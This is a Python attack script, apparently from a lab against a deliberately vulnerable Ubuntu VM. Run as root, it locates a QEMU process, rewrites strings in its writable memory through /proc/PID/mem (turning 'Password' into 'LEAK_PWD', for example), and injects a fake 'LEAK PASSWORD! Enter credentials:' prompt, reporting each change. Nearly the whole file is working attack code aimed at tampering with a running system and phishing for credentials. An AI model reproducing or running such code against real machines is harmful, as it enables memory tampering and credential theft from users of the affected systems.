#!/usr/bin/env python3
"""
PASIV Detailed Password Attack
Shows detailed before/after content of memory modifications
"""

import os
import sys
import subprocess

class DetailedPasswordAttack:
    def __init__(self):
        self.vm_process = None
        
    def find_vm_process(self):
        """Find the running QEMU VM process"""
        try:
            result = subprocess.run(['ps', 'aux'], capture_output=True, text=True)
            for line in result.stdout.split('\n'):
                if 'qemu-system-x86_64' in line and 'ubuntu-desktop-vulnerable' in line:
                    parts = line.split()
                    self.vm_process = int(parts[1])
                    return True
            return False
        except Exception as e:
            print(f"❌ Error finding VM process: {e}")
            return False
    
    def search_and_replace_with_details(self):
        """Search for any replaceable strings and show detailed before/after"""
        # Broader search for any strings we can replace
        search_targets = [
            # Look for any text that might be replaceable
            {"find": "Welcome", "replace": "PWNED!!"},
            {"find": "Security", "replace": "HACKED!"},
            {"find": "Password", "replace": "LEAK_PWD"},
            {"find": "Connect", "replace": "HIJACK!"},
            {"find": "Extension", "replace": "MALWARE"},
            {"find": "Account", "replace": "STOLEN!"},
            {"find": "Login", "replace": "CRACK!!"},
            {"find": "Enter", "replace": "GIVE_"},
            {"find": "Type", "replace": "LEAK"},
            {"find": "Input", "replace": "STEAL"}
        ]
        
        replacements_made = 0
        
        try:
            # Read memory maps for writable regions
            with open(f'/proc/{self.vm_process}/maps', 'r') as f:
                maps = f.read()
                
            # Parse writable memory regions 
            memory_regions = []
            for line in maps.split('\n'):
                if line.strip() and 'rw' in line:
                    parts = line.split()
                    if len(parts) >= 2:
                        addr_range = parts[0]
                        if '-' in addr_range:
                            start_str, end_str = addr_range.split('-')
                            start_addr = int(start_str, 16)
                            end_addr = int(end_str, 16)
                            size = end_addr - start_addr
                            if 1024 < size < 20 * 1024 * 1024:  # 1KB to 20MB
                                memory_regions.append((start_addr, end_addr, size))
            
            print(f"🔍 Searching {len(memory_regions)} writable memory regions...")
            
            # Search for target strings in writable memory
            with open(f'/proc/{self.vm_process}/mem', 'r+b') as mem_file:
                for start_addr, end_addr, size in memory_regions[:30]:  # Search more regions
                    try:
                        mem_file.seek(start_addr)
                        data = mem_file.read(size)
                        
                        for target in search_targets:
                            find_text = target["find"]
                            replace_text = target["replace"]
                            
                            # Search for the text
                            find_bytes = find_text.encode('utf-8')
                            pos = data.find(find_bytes)
                            
                            if pos != -1:
                                actual_addr = start_addr + pos
                                
                                # Show context before replacement
                                context_start = max(0, pos - 20)
                                context_end = min(len(data), pos + len(find_bytes) + 20)
                                before_context = data[context_start:context_end]
                                
                                print(f"\n🎯 FOUND TARGET at 0x{actual_addr:x}:")
                                print(f"   BEFORE: ...{before_context.decode('utf-8', errors='ignore')}...")
                                
                                # Ensure replacement fits
                                if len(replace_text) <= len(find_text):
                                    # Pad replacement if needed
                                    replacement_bytes = replace_text.ljust(len(find_text)).encode('utf-8')
                                    
                                    # Replace the text
                                    mem_file.seek(actual_addr)
                                    mem_file.write(replacement_bytes)
                                    mem_file.flush()
                                    
                                    # Read back to show what we wrote
                                    mem_file.seek(start_addr + context_start)
                                    after_data = mem_file.read(context_end - context_start)
                                    
                                    print(f"   AFTER:  ...{after_data.decode('utf-8', errors='ignore')}...")
                                    print(f"   ✅ Successfully replaced '{find_text}' with '{replace_text}'")
                                    
                                    replacements_made += 1
                                else:
                                    print(f"   ❌ Replacement too long: '{replace_text}' > '{find_text}'")
                                    
                    except (OSError, PermissionError) as e:
                        continue
                        
        except Exception as e:
            print(f"❌ Error during search and replace: {e}")
            
        return replacements_made
    
    def inject_with_details(self, location_addr, size):
        """Inject malicious prompt and show detailed before/after"""
        malicious_prompt = "LEAK PASSWORD! Enter credentials: "
        
        try:
            with open(f'/proc/{self.vm_process}/mem', 'r+b') as mem_file:
                # Read original content (more context)
                mem_file.seek(location_addr)
                original_data = mem_file.read(len(malicious_prompt) + 20)
                
                print(f"\n🎯 INJECTION at 0x{location_addr:x}:")
                print(f"   BEFORE: {original_data.decode('utf-8', errors='ignore')[:50]}...")
                
                # Write malicious prompt
                mem_file.seek(location_addr)
                prompt_bytes = malicious_prompt.encode('utf-8')
                mem_file.write(prompt_bytes)
                mem_file.flush()
                
                # Read back to verify
                mem_file.seek(location_addr)
                verify_data = mem_file.read(len(malicious_prompt) + 20)
                
                print(f"   AFTER:  {verify_data.decode('utf-8', errors='ignore')[:50]}...")
                
                if "LEAK PASSWORD" in verify_data.decode('utf-8', errors='ignore'):
                    print(f"   ✅ Malicious prompt successfully injected!")
                    return True
                else:
                    print(f"   ❌ Injection verification failed")
                    return False
                    
        except Exception as e:
            print(f"   ❌ Error during injection: {e}")
            return False
    
    def run_detailed_attack(self):
        """Execute detailed password attack with full visibility"""
        print("🔐 PASIV Detailed Password Attack - Full Visibility DMA")
        print("=" * 70)
        
        # Find VM process
        print("🔍 Finding VM process...")
        if not self.find_vm_process():
            print("❌ No running VM found")
            return False
            
        print(f"✅ Found VM process: PID {self.vm_process}")
        
        # Step 1: Search and replace with detailed output
        print(f"\n🎯 Step 1: Searching for replaceable strings in VM memory...")
        print("=" * 50)
        replacements = self.search_and_replace_with_details()
        
        if replacements > 0:
            print(f"\n✅ Successfully replaced {replacements} strings with detailed output shown above!")
        else:
            print(f"\n❌ No replaceable strings found in writable memory")
        
        # Step 2: Detailed injection demonstration
        print(f"\n🎯 Step 2: Detailed malicious injection demonstration...")
        print("=" * 50)
        
        # Find one writable location for detailed demo
        try:
            with open(f'/proc/{self.vm_process}/maps', 'r') as f:
                maps = f.read()
                
            for line in maps.split('\n'):
                if line.strip() and 'rw-p' in line:
                    parts = line.split()
                    if len(parts) >= 2:
                        addr_range = parts[0]
                        if '-' in addr_range:
                            start_str, end_str = addr_range.split('-')
                            start_addr = int(start_str, 16)
                            end_addr = int(end_str, 16)
                            size = end_addr - start_addr
                            if 4096 < size < 1024 * 1024:  # 4KB to 1MB
                                # Test injection at this location
                                test_addr = start_addr + 200  # Safe offset
                                if self.inject_with_details(test_addr, size):
                                    print(f"\n✅ Detailed injection demonstration completed!")
                                    break
        except Exception as e:
            print(f"❌ Error during injection demo: {e}")
        
        print(f"\n🚨 DETAILED ATTACK RESULTS:")
        print(f"🎯 String replacements: {replacements}")
        print(f"🎯 Injection demonstrations: 1")
        print(f"💀 Total memory modifications: {replacements + 1}")
        
        if replacements > 0:
            print(f"\n✅ DETAILED PASSWORD ATTACK SUCCESSFUL!")
            print(f"🔥 All modifications shown with before/after content")
            print(f"💀 VM memory compromised with full visibility")
        
        return replacements > 0

def main():
    if os.geteuid() != 0:
        print("❌ Root privileges required for memory access")
        return 1
        
    attacker = DetailedPasswordAttack()
    success = attacker.run_detailed_attack()
    return 0 if success else 1

if __name__ == "__main__":
    sys.exit(main()) 